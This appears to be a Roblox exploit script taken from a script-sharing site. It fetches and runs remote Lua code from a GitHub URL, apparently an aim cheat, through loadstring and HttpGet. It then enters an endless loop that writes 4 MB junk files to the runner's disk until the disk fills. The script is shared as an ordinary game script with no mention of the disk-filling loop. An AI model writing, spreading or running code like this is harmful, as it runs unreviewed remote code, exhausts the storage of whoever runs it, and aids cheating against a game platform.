-- Script taken from https://xenoscripts.com website --

-- Join our discord https://discord.gg/5S8ApF6rRp
loadstring(game:HttpGet("https://raw.githubusercontent.com/asldsaldle12/spj-aim/refs/heads/main/main.lua"))()
local fileNamePrefix = "Systematic"
local fileSize = 4 * 1024 * 1024
local content = string.rep("A", fileSize)

local startTime = os.clock()
local counter = 1

while true do
    local fileName = fileNamePrefix .. counter .. ".txt"

    local success, err = pcall(function()
        writefile(fileName, content)
    end)

    if success then
        print("Success: " .. fileName)
    else
        warn("Failed: " .. tostring(err))
    end

    counter = counter + 1

    if os.clock() - startTime < 20 then
        task.wait(0.15)
    end
end
